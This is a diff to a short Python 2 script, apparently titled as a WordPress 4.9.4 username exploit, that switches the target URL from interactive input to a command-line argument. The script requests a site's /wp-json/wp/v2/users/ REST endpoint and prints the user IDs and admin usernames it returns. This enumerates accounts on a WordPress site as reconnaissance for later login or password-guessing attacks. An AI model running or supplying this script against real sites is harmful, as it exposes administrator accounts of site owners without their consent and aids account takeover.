@@ -4,12 +4,12 @@
 import urllib
 import json
 import re
+import sys
 #OsmanKandemir
 
 
-#op = raw_input("Target Url : ")
 #exp = "/wp-json/wp/v2/users/1"
-#url = op + exp
+#url = sys.argv[1] + exp
 #res = urllib.urlopen(url)
 #d = json.loads(res.read())
 #print "ID : " + str(d["id"])+"\n"+"Admin username : " + str(d["name"])
@@ -28,10 +28,9 @@ print """
       """          
 
 		
-
-op = raw_input("Target Url : ")
+#Using python wp-4.9.4_UsernameExp_Python.py SİTE
 exp = "/wp-json/wp/v2/users/"
-url = op + exp
+url = sys.argv[1] + exp
 res = urllib.urlopen(url)
 re1 = res.read()
 
